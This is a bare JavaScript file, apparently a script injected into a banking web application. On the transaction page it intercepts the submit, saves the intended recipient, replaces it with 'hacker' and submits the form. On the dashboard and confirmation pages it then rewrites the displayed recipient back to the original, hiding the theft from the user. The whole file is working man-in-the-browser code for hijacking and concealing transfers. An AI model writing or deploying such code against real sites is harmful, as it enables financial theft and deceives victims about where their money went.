if (
  window.location.pathname == "/make_transaction/" &&
  document.getElementById("confirm_transaction_form") != null
) {
  const form = document.getElementById("confirm_transaction_form");
  const recipientInput = document.getElementsByName("recipient")[0];
  const amountInput = document.getElementsByName("amount")[0];

  form.addEventListener("submit", event => {
    event.preventDefault();
    let hackerTransfers = JSON.parse(
      window.localStorage.getItem("hackerTransfers") || "[]"
    );
    hackerTransfers.push({
      "recipient": recipientInput.value,
      "amount": amountInput.value
    });
    window.localStorage.setItem(
      "hackerTransfers",
      JSON.stringify(hackerTransfers)
    );
    recipientInput.value = "hacker";
    form.submit();
  });
} else if (window.location.pathname == "/dashboard/") {
  const dashboardTransfers = getDashboardTransfers();
  const hackerTransfers = JSON.parse(
    window.localStorage.getItem("hackerTransfers") || "[]"
  );
  for (dashboardTransfer of dashboardTransfers) {
    if (dashboardTransfer.recipient.innerText == "hacker") {
      dashboardTransfer.recipient.innerText = hackerTransfers.find(
        t => t.amount == dashboardTransfer.amount.innerText
      ).recipient;
    }
  }
}
 else if (window.location.pathname == "/make_transaction/confirm") {
  const recipient = document.getElementById("recipient_complete");
  const amount = document.getElementById("amount_complete").innerText.split(' ')[1];
  if (recipient.innerText.includes("hacker")) {
    const hackerTransfers = JSON.parse(
      window.localStorage.getItem("hackerTransfers") || "[]"
    );
    recipient.innerText = `Recipient: ${
      hackerTransfers.find(
        t => t.amount == amount
      ).recipient
    }`
  }
}

function getDashboardTransfers() {
  const rows = document.querySelectorAll(".table > tbody > tr");
  return Array.from(rows)
    .map(row => Array.from(row.children).slice(0, 2))
    .map(row => ({
      "recipient": row[0],
      "amount": row[1]
    }));
}
